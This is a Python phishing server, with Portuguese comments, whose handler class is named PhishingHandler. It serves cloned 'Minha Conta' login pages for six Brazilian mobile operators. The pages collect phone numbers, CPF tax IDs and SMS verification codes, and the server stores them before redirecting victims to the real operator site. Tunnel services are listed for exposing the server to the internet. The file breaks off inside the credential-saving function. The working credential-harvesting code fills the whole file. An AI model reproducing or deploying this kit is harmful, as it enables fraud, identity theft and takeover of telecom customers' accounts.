#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import threading
import http.server
import socketserver
import json
import time
import random
import subprocess
import requests
from urllib.parse import urlparse, parse_qs
from datetime import datetime

# Configurações
PORT = 8080
HOST = "0.0.0.0"
DATA_FILE = "dados_operadoras.txt"
LOG_FILE = "servidor_operadoras.log"
TUNNEL_SERVICES = ["localhost", "serveo", "ngrok", "cloudflared", "localtunnel"]

# Cores para output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Template base HTML para operadoras
OPERATOR_HTML = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <link rel="shortcut icon" href="{favicon}" type="image/x-icon">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }}
        
        body {{
            background: {background};
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            background-image: {background_pattern};
            background-size: cover;
        }}
        
        .login-container {{
            background: #fff;
            padding: 35px 30px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 480px;
            position: relative;
            overflow: hidden;
        }}
        
        .login-container::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: {brand_color};
        }}
        
        .operator-header {{
            text-align: center;
            margin-bottom: 25px;
            padding-bottom: 20px;
            border-bottom: 1px solid #eee;
        }}
        
        .operator-header h1 {{
            font-size: 28px;
            margin-bottom: 10px;
            color: {brand_color};
            font-weight: 700;
        }}
        
        .operator-header p {{
            color: #666;
            font-size: 15px;
        }}
        
        .operator-logo {{
            margin-bottom: 15px;
        }}
        
        .operator-logo img {{
            height: 55px;
        }}
        
        .form-group {{
            margin-bottom: 22px;
            position: relative;
        }}
        
        .form-group label {{
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #444;
            font-size: 14px;
        }}
        
        .form-group input {{
            width: 100%;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
        }}
        
        .form-group input:focus {{
            outline: none;
            border-color: {brand_color};
            box-shadow: 0 0 0 3px {brand_color}20;
        }}
        
        .password-toggle {{
            position: absolute;
            right: 15px;
            top: 42px;
            cursor: pointer;
            color: #777;
        }}
        
        .btn {{
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 8px;
            background: {brand_color};
            color: white;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }}
        
        .btn::after {{
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 5px;
            height: 5px;
            background: rgba(255, 255, 255, 0.5);
            opacity: 0;
            border-radius: 100%;
            transform: scale(1, 1) translate(-50%);
            transform-origin: 50% 50%;
        }}
        
        .btn:hover {{
            background: {hover_color};
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }}
        
        .btn:active::after {{
            animation: ripple 1s ease-out;
        }}
        
        @keyframes ripple {{
            0% {{
                transform: scale(0, 0);
                opacity: 0.5;
            }}
            20% {{
                transform: scale(50, 50);
                opacity: 0.3;
            }}
            100% {{
                transform: scale(100, 100);
                opacity: 0;
            }}
        }}
        
        .footer {{
            text-align: center;
            margin-top: 25px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            font-size: 13px;
            color: #888;
        }}
        
        .footer a {{
            color: {brand_color};
            text-decoration: none;
            font-weight: 600;
        }}
        
        .footer a:hover {{
            text-decoration: underline;
        }}
        
        .security-alert {{
            background: #f8f9fa;
            padding: 16px;
            border-radius: 8px;
            margin-top: 20px;
            font-size: 13px;
            color: #5f6368;
            border-left: 4px solid {brand_color};
            display: flex;
            align-items: flex-start;
        }}
        
        .security-alert strong {{
            display: block;
            margin-bottom: 5px;
            color: {brand_color};
        }}
        
        .alert-icon {{
            margin-right: 12px;
            font-size: 18px;
            color: {brand_color};
        }}
        
        .error-message {{
            color: #d93025;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
            display: none;
            background: #fce8e6;
            padding: 14px;
            border-radius: 6px;
            border-left: 4px solid #d93025;
        }}
        
        .success-message {{
            color: #0f9d58;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
            display: none;
            background: #e6f4ea;
            padding: 14px;
            border-radius: 6px;
            border-left: 4px solid #0f9d58;
        }}
        
        .verification-code {{
            display: none;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            animation: fadeIn 0.5s;
        }}
        
        .language-selector {{
            position: absolute;
            top: 20px;
            right: 20px;
        }}
        
        .language-selector select {{
            padding: 8px 12px;
            border-radius: 6px;
            border: 1px solid #ddd;
            font-size: 13px;
            background: white;
        }}
        
        .operator-security {{
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 15px;
            gap: 10px;
            font-size: 13px;
            color: #5f6368;
        }}
        
        .operator-security img {{
            height: 22px;
        }}
        
        .progress-bar {{
            height: 4px;
            width: 100%;
            background: #f0f0f0;
            border-radius: 2px;
            margin-top: 15px;
            overflow: hidden;
            display: none;
        }}
        
        .progress {{
            height: 100%;
            width: 0%;
            background: {brand_color};
            border-radius: 2px;
            transition: width 3s ease-in-out;
        }}
        
        .captcha-container {{
            margin: 20px 0;
            padding: 15px;
            background: #f9f9f9;
            border-radius: 8px;
            text-align: center;
            border: 1px solid #eee;
        }}
        
        .captcha-text {{
            font-size: 24px;
            letter-spacing: 5px;
            font-weight: bold;
            color: #333;
            background: #eee;
            padding: 10px;
            border-radius: 4px;
            margin-bottom: 10px;
            user-select: none;
        }}
        
        @keyframes fadeIn {{
            from {{ opacity: 0; }}
            to {{ opacity: 1; }}
        }}
        
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
            vertical-align: middle;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        .phone-input {{
            display: flex;
            gap: 10px;
        }}
        
        .ddi {{
            width: 70px;
        }}
        
        .phone {{
            flex: 1;
        }}
        
        @media (max-width: 480px) {{
            .login-container {{
                padding: 25px 20px;
            }}
            
            .operator-header h1 {{
                font-size: 24px;
            }}
            
            .phone-input {{
                flex-direction: column;
            }}
        }}
    </style>
</head>
<body>
    <div class="language-selector">
        <select onchange="changeLanguage(this.value)">
            <option value="pt">Português</option>
            <option value="en">English</option>
            <option value="es">Español</option>
        </select>
    </div>

    <div class="login-container">
        <div class="operator-header">
            <div class="operator-logo">
                <img src="{logo}" alt="{operator_name}">
            </div>
            <h1>{operator_name}</h1>
            <p>{welcome_message}</p>
        </div>
        
        <form id="loginForm" method="POST">
            <div class="form-group">
                <label for="phone_number">{phone_label}</label>
                <div class="phone-input">
                    <input type="text" id="ddi" name="ddi" class="ddi" value="+55" readonly>
                    <input type="text" id="phone_number" name="phone_number" class="phone" required placeholder="{phone_placeholder}" autocomplete="off">
                </div>
            </div>
            
            <div class="form-group">
                <label for="cpf">{cpf_label}</label>
                <input type="text" id="cpf" name="cpf" required placeholder="{cpf_placeholder}" autocomplete="off">
            </div>
            
            <div class="captcha-container" id="captchaContainer">
                <div class="captcha-text" id="captchaText">A1B2C3</div>
                <input type="text" id="captchaInput" placeholder="Digite o código acima" autocomplete="off">
            </div>
            
            <div class="verification-code" id="verificationCode">
                <div class="form-group">
                    <label for="code">Código de Verificação</label>
                    <input type="text" id="code" name="code" placeholder="Digite o código de 6 dígitos" autocomplete="off">
                    <p style="font-size: 12px; color: #666; margin-top: 5px;">Enviamos um código para seu telefone via SMS</p>
                </div>
            </div>
            
            <button type="submit" class="btn" id="submitBtn">
                <span id="btnText">{login_button}</span>
            </button>
            
            <div class="progress-bar" id="progressBar">
                <div class="progress" id="progress"></div>
            </div>
        </form>
        
        <div class="error-message" id="errorMessage">
            {error_message}
        </div>
        
        <div class="success-message" id="successMessage">
            {success_message}
        </div>
        
        <div class="security-alert">
            <div class="alert-icon">🔒</div>
            <div>
                <strong>⚠️ Aviso de Segurança</strong>
                {security_message}
            </div>
        </div>
        
        <div class="operator-security">
            <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23009900' d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z'/></svg>" alt="Seguro">
            <span>Conexão Segura • SSL</span>
        </div>
        
        <div class="footer">
            <p>{footer_text_1} <a href="#">{footer_link}</a></p>
            <p>© {current_year} {operator_name}. {footer_rights}</p>
        </div>
    </div>

    <script>
        // Gerar CAPTCHA
        function generateCaptcha() {{
            var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
            var captcha = '';
            for (var i = 0; i < 6; i++) {{
                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
            }}
            document.getElementById('captchaText').textContent = captcha;
            return captcha;
        }}
        
        var currentCaptcha = generateCaptcha();
        
        // Formatar CPF
        function formatCPF(cpf) {{
            cpf = cpf.replace(/\D/g, '');
            cpf = cpf.replace(/(\d{{3}})(\d)/, '$1.$2');
            cpf = cpf.replace(/(\d{{3}})(\d)/, '$1.$2');
            cpf = cpf.replace(/(\d{{3}})(\d{{1,2}})$/, '$1-$2');
            return cpf;
        }}
        
        document.getElementById('cpf').addEventListener('input', function(e) {{
            e.target.value = formatCPF(e.target.value);
        }});
        
        // Formatar telefone
        function formatPhone(phone) {{
            phone = phone.replace(/\D/g, '');
            phone = phone.replace(/^(\d{{2}})(\d)/g, '($1) $2');
            phone = phone.replace(/(\d)(\d{{4}})$/, '$1-$2');
            return phone;
        }}
        
        document.getElementById('phone_number').addEventListener('input', function(e) {{
            e.target.value = formatPhone(e.target.value);
        }});
        
        // Simular processo de login
        function simulateLogin() {{
            var btn = document.getElementById('submitBtn');
            var btnText = document.getElementById('btnText');
            var progressBar = document.getElementById('progressBar');
            var progress = document.getElementById('progress');
            
            // Verificar CAPTCHA
            var captchaInput = document.getElementById('captchaInput').value;
            if (captchaInput !== currentCaptcha) {{
                document.getElementById('errorMessage').textContent = 'Código de verificação incorreto. Tente novamente.';
                document.getElementById('errorMessage').style.display = 'block';
                document.getElementById('successMessage').style.display = 'none';
                generateCaptcha();
                return false;
            }}
            
            // Desativar botão
            btn.disabled = true;
            btnText.innerHTML = '<div class="loading-spinner"></div> Verificando...';
            
            // Mostrar barra de progresso
            progressBar.style.display = 'block';
            setTimeout(function() {{
                progress.style.width = '100%';
            }}, 100);
            
            // Simular envio de código de verificação (60% das vezes)
            if (Math.random() < 0.6) {{
                setTimeout(function() {{
                    document.getElementById('verificationCode').style.display = 'block';
                    document.getElementById('successMessage').style.display = 'block';
                    document.getElementById('successMessage').innerHTML = 'Enviamos um código de verificação para seu telefone. Digite-o abaixo.';
                    document.getElementById('errorMessage').style.display = 'none';
                    
                    // Restaurar botão
                    btn.disabled = false;
                    btnText.textContent = 'Verificar Código';
                    progressBar.style.display = 'none';
                    progress.style.width = '0%';
                }}, 2500);
            }} else {{
                // Mostrar mensagem de sucesso
                document.getElementById('successMessage').style.display = 'block';
                document.getElementById('errorMessage').style.display = 'none';
                
                // Simular processo de login
                setTimeout(function() {{
                    document.getElementById('loginForm').submit();
                }}, 3500);
            }}
        }}
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            simulateLogin();
        }});
        
        function changeLanguage(lang) {{
            var languages = {{
                'pt': 'Português',
                'en': 'English',
                'es': 'Español'
            }};
            alert('Idioma alterado para ' + languages[lang]);
        }}
    </script>
</body>
</html>
"""

# Templates específicos para cada operadora
OPERATOR_TEMPLATES = {
    "tim": {
        "title": "TIM - Minha Conta",
        "operator_name": "TIM",
        "brand_color": "#009c3b",
        "hover_color": "#007a2f",
        "background": "#F5F5F5",
        "background_pattern": "url('data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\" viewBox=\"0 0 20 20\"><rect width=\"20\" height=\"20\" fill=\"%23f9f9f9\"/><path d=\"M0 0L20 20M20 0L0 20\" stroke=\"%23e6f4ec\" stroke-width=\"0.5\"/></svg>')",
        "logo": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 40'><text x='0' y='30' font-family='Arial' font-size='30' font-weight='bold' fill='%23009c3b'>TIM</text></svg>",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23009c3b' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z'/></svg>",
        "welcome_message": "Acesse sua conta TIM",
        "phone_label": "Número de telefone",
        "phone_placeholder": "(00) 00000-0000",
        "cpf_label": "CPF",
        "cpf_placeholder": "000.000.000-00",
        "login_button": "Acessar",
        "error_message": "Número ou CPF incorretos. Tente novamente.",
        "success_message": "Autenticação bem-sucedida! Redirecionando...",
        "security_message": "Protegemos seus dados com criptografia avançada.",
        "footer_text_1": "Problemas para acessar?",
        "footer_link": "Ajuda",
        "footer_rights": "Todos os direitos reservados.",
        "path": "/tim"
    },
    "claro": {
        "title": "Claro - Minha Conta",
        "operator_name": "Claro",
        "brand_color": "#660099",
        "hover_color": "#4d0073",
        "background": "#F5F5F5",
        "background_pattern": "url('data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\" viewBox=\"0 0 20 20\"><rect width=\"20\" height=\"20\" fill=\"%23f9f9f9\"/><circle cx=\"10\" cy=\"10\" r=\"8\" fill=\"%23f5f0f9\" stroke=\"%23f0e6f5\" stroke-width=\"0.5\"/></svg>')",
        "logo": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 40'><text x='0' y='30' font-family='Arial' font-size='30' font-weight='bold' fill='%23660099'>CLARO</text></svg>",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23660099' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z'/></svg>",
        "welcome_message": "Acesse sua conta Claro",
        "phone_label": "Número de telefone",
        "phone_placeholder": "(00) 00000-0000",
        "cpf_label": "CPF",
        "cpf_placeholder": "000.000.000-00",
        "login_button": "Continuar",
        "error_message": "Dados incorretos. Verifique e tente novamente.",
        "success_message": "Login realizado com sucesso!",
        "security_message": "Sua conexão está segura com nossos protocolos de segurança.",
        "footer_text_1": "Esqueceu seus dados?",
        "footer_link": "Recuperar acesso",
        "footer_rights": "© Claro SA.",
        "path": "/claro"
    },
    "vivo": {
        "title": "Vivo - Minha Conta",
        "operator_name": "Vivo",
        "brand_color": "#FF0000",
        "hover_color": "#cc0000",
        "background": "#F7F7F7",
        "background_pattern": "url('data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\" viewBox=\"0 0 20 20\"><rect width=\"20\" height=\"20\" fill=\"%23fafafa\"/><path d=\"M0 0L20 20M20 0L0 20\" stroke=\"%23fee6e6\" stroke-width=\"0.5\"/></svg>')",
        "logo": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 40'><text x='0' y='30' font-family='Arial' font-size='30' font-weight='bold' fill='%23FF0000'>VIVO</text></svg>",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23FF0000' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z'/></svg>",
        "welcome_message": "Acesse sua conta Vivo",
        "phone_label": "Número de telefone",
        "phone_placeholder": "(00) 00000-0000",
        "cpf_label": "CPF",
        "cpf_placeholder": "000.000.000-00",
        "login_button": "Entrar",
        "error_message": "Número ou CPF inválidos.",
        "success_message": "Autenticando... Aguarde um momento.",
        "security_message": "Utilizamos tecnologia avançada para proteger suas informações.",
        "footer_text_1": "Primeiro acesso?",
        "footer_link": "Cadastre-se",
        "footer_rights": "Vivo © 2023",
        "path": "/vivo"
    },
    "oi": {
        "title": "Oi - Minha Conta",
        "operator_name": "Oi",
        "brand_color": "#00a1e0",
        "hover_color": "#0081b3",
        "background": "#F5F5F5",
        "background_pattern": "url('data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\" viewBox=\"0 0 20 20\"><rect width=\"20\" height=\"20\" fill=\"%23f9f9f9\"/><circle cx=\"10\" cy=\"10\" r=\"8\" fill=\"%23e6f5fc\" stroke=\"%23e0f2fa\" stroke-width=\"0.5\"/></svg>')",
        "logo": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 40'><text x='0' y='30' font-family='Arial' font-size='30' font-weight='bold' fill='%2300a1e0'>OI</text></svg>",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%2300a1e0' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z'/></svg>",
        "welcome_message": "Acesse sua conta Oi",
        "phone_label": "Número de telefone",
        "phone_placeholder": "(00) 00000-0000",
        "cpf_label": "CPF",
        "cpf_placeholder": "000.000.000-00",
        "login_button": "Continuar",
        "error_message": "Dados incorretos. Verifique e tente novamente.",
        "success_message": "Validando credenciais...",
        "security_message": "Seus dados estão protegidos pelas melhores práticas de segurança.",
        "footer_text_1": "Problemas com o acesso?",
        "footer_link": "Clique aqui",
        "footer_rights": "Oi © 2023",
        "path": "/oi"
    },
    "nextel": {
        "title": "Nextel - Minha Conta",
        "operator_name": "Nextel",
        "brand_color": "#80276c",
        "hover_color": "#661f57",
        "background": "#F5F5F5",
        "background_pattern": "url('data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\" viewBox=\"0 0 20 20\"><rect width=\"20\" height=\"20\" fill=\"%23f9f9f9\"/><path d=\"M0 10L10 0l10 10-10 10z\" fill=\"%23f5eef3\" stroke=\"%23f0e6ed\" stroke-width=\"0.5\"/></svg>')",
        "logo": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 40'><text x='0' y='30' font-family='Arial' font-size='30' font-weight='bold' fill='%2380276c'>NEXTEL</text></svg>",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%2380276c' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z'/></svg>",
        "welcome_message": "Acesse sua conta Nextel",
        "phone_label": "Número de telefone",
        "phone_placeholder": "(00) 00000-0000",
        "cpf_label": "CPF",
        "cpf_placeholder": "000.000.000-00",
        "login_button": "Acessar",
        "error_message": "Número ou CPF incorretos. Tente novamente.",
        "success_message": "Autenticação bem-sucedida! Redirecionando...",
        "security_message": "Mantenha seus dados confidenciais. Não compartilhe suas informações.",
        "footer_text_1": "Problemas para acessar?",
        "footer_link": "Ajuda",
        "footer_rights": "Todos os direitos reservados.",
        "path": "/nextel"
    },
    "algar": {
        "title": "Algar Telecom - Minha Conta",
        "operator_name": "Algar Telecom",
        "brand_color": "#00a59d",
        "hover_color": "#00847d",
        "background": "#F5F5F5",
        "background_pattern": "url('data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"20\" height=\"20\" viewBox=\"0 0 20 20\"><rect width=\"20\" height=\"20\" fill=\"%23f9f9f9\"/><path d=\"M0 0L20 20M20 0L0 20\" stroke=\"%23e6f4f3\" stroke-width=\"0.5\"/></svg>')",
        "logo": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 40'><text x='0' y='30' font-family='Arial' font-size='24' font-weight='bold' fill='%2300a59d'>ALGAR TELECOM</text></svg>",
        "favicon": "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%2300a59d' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13.5h2v7h-2v-7zm1 10c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z'/></svg>",
        "welcome_message": "Acesse sua conta Algar Telecom",
        "phone_label": "Número de telefone",
        "phone_placeholder": "(00) 00000-0000",
        "cpf_label": "CPF",
        "cpf_placeholder": "000.000.000-00",
        "login_button": "Entrar",
        "error_message": "Dados incorretos. Verifique e tente novamente.",
        "success_message": "Autenticando... Aguarde um momento.",
        "security_message": "Utilizamos tecnologia avançada para proteger suas informações.",
        "footer_text_1": "Primeiro acesso?",
        "footer_link": "Cadastre-se",
        "footer_rights": "Algar Telecom © 2023",
        "path": "/algar"
    }
}

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Log da requisição
        self.log_request()
        
        # Verificar se a rota corresponde a alguma operadora
        for operator, config in OPERATOR_TEMPLATES.items():
            if self.path == config["path"] or self.path == config["path"] + "/":
                self.send_login_page(operator)
                return
                
        # Página inicial com lista de operadoras
        if self.path == "/":
            self.send_index_page()
            return
            
        # Servir arquivos estáticos se existirem
        if self.path.endswith(('.css', '.js', '.png', '.jpg', '.ico')):
            super().do_GET()
            return
            
        # Página não encontrada
        self.send_error(404, "Página não encontrada")
        
    def do_POST(self):
        # Processar dados de login
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        form_data = parse_qs(post_data)
        
        # Extrair dados
        ddi = form_data.get('ddi', [''])[0]
        phone_number = form_data.get('phone_number', [''])[0]
        cpf = form_data.get('cpf', [''])[0]
        code = form_data.get('code', [''])[0]
        captcha = form_data.get('captcha', [''])[0]
        
        # Determinar de qual operadora veio o login
        operator = "unknown"
        for op, config in OPERATOR_TEMPLATES.items():
            if self.path == config["path"]:
                operator = op
                break
                
        # Salvar dados
        self.save_credentials(operator, ddi, phone_number, cpf, code, captcha)
        
        # Redirecionar para página oficial da operadora
        redirect_url = self.get_redirect_url(operator)
        self.send_response(302)
        self.send_header('Location', redirect_url)
        self.end_headers()
        
    def send_login_page(self, operator):
        if operator not in OPERATOR_TEMPLATES:
            self.send_error(404, "Operadora não encontrada")
            return
            
        config = OPERATOR_TEMPLATES[operator]
        current_year = datetime.now().year
        
        # Gerar HTML personalizado
        html_content = OPERATOR_HTML.format(
            title=config["title"],
            operator_name=config["operator_name"],
            brand_color=config["brand_color"],
            hover_color=config["hover_color"],
            background=config["background"],
            background_pattern=config["background_pattern"],
            logo=config["logo"],
            favicon=config["favicon"],
            welcome_message=config["welcome_message"],
            phone_label=config["phone_label"],
            phone_placeholder=config["phone_placeholder"],
            cpf_label=config["cpf_label"],
            cpf_placeholder=config["cpf_placeholder"],
            login_button=config["login_button"],
            error_message=config["error_message"],
            success_message=config["success_message"],
            security_message=config["security_message"],
            footer_text_1=config["footer_text_1"],
            footer_link=config["footer_link"],
            footer_rights=config["footer_rights"],
            current_year=current_year
        )
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))
        
    def send_index_page(self):
        html_content = """
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Operadoras de Telefonia - Acesso à Minha Conta</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #1a2a6c, #2a4b8c);
                    color: #fff;
                    min-height: 100vh;
                    padding: 40px 20px;
                }
                
                .container {
                    max-width: 1000px;
                    margin: 0 auto;
                }
                
                header {
                    text-align: center;
                    margin-bottom: 40px;
                }
                
                header h1 {
                    font-size: 36px;
                    margin-bottom: 10px;
                    text-shadow: 0 2px 4px rgba(0,0,0,0.2);
                }
                
                header p {
                    font-size: 18px;
                    opacity: 0.9;
                }
                
                .security-badge {
                    background: rgba(255, 255, 255, 0.1);
                    padding: 15px 20px;
                    border-radius: 10px;
                    margin: 20px auto;
                    max-width: 500px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 10px;
                    backdrop-filter: blur(5px);
                    border: 1px solid rgba(255, 255, 255, 0.2);
                }
                
                .security-badge img {
                    height: 30px;
                }
                
                .operators-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
                    gap: 25px;
                    margin-top: 30px;
                }
                
                .operator-card {
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 12px;
                    padding: 25px;
                    text-align: center;
                    transition: transform 0.3s, box-shadow 0.3s;
                    cursor: pointer;
                    backdrop-filter: blur(10px);
                    border: 1px solid rgba(255, 255, 255, 0.2);
                    position: relative;
                    overflow: hidden;
                }
                
                .operator-card::before {
                    content: '';
                    position: absolute;
                    top: 0;
                    left: 0;
                    right: 0;
                    height: 4px;
                    background: var(--brand-color);
                }
                
                .operator-card:hover {
                    transform: translateY(-5px);
                    box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
                    background: rgba(255, 255, 255, 0.15);
                }
                
                .operator-card h2 {
                    margin: 15px 0;
                    font-size: 22px;
                }
                
                .operator-card a {
                    display: inline-block;
                    padding: 12px 24px;
                    background: #fff;
                    color: #1a2a6c;
                    text-decoration: none;
                    border-radius: 8px;
                    font-weight: bold;
                    transition: all 0.3s;
                }
                
                .operator-card a:hover {
                    background: #eee;
                    transform: translateY(-2px);
                    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
                }
                
                footer {
                    text-align: center;
                    margin-top: 50px;
                    opacity: 0.7;
                    font-size: 14px;
                }
                
                .disclaimer {
                    background: rgba(255, 255, 255, 0.1);
                    padding: 20px;
                    border-radius: 10px;
                    margin-top: 30px;
                    font-size: 14px;
                    text-align: center;
                    backdrop-filter: blur(5px);
                    border: 1px solid rgba(255, 255, 255, 0.2);
                }
                
                @media (max-width: 768px) {
                    .operators-grid {
                        grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
                    }
                    
                    header h1 {
                        font-size: 28px;
                    }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <header>
                    <h1>Minha Conta</h1>
                    <p>Selecione sua operadora para acessar sua conta</p>
                    
                    <div class="security-badge">
                        <img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%2300ff00' d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z'/></svg>" alt="Seguro">
                        <span>Conexão Segura • Criptografia SSL</span>
                    </div>
                </header>
                
                <div class="operators-grid">
        """
        
        # Adicionar cards para cada operadora
        for operator, config in OPERATOR_TEMPLATES.items():
            html_content += f"""
                    <div class="operator-card" style="--brand-color: {config['brand_color']}">
                        <h2>{config['operator_name']}</h2>
                        <a href="{config['path']}">Acessar Minha Conta</a>
                    </div>
            """
        
        html_content += """
                </div>
                
                <div class="disclaimer">
                    <p>⚠️ <strong>Aviso de Segurança:</strong> Mantenha suas credenciais em local seguro. 
                    Nunca compartilhe seus dados com terceiros. Certifique-se de que está em um ambiente seguro antes de acessar.</p>
                </div>
                
                <footer>
                    <p>© 2023 Sistema de Acesso a Operadoras. Todos os direitos reservados.</p>
                </footer>
            </div>
        </body>
        </html>
        """
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))
        
    def save_credentials(self, operator, ddi, phone_number, cpf, code="", captcha=""):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_address = self.client_address[0]
        
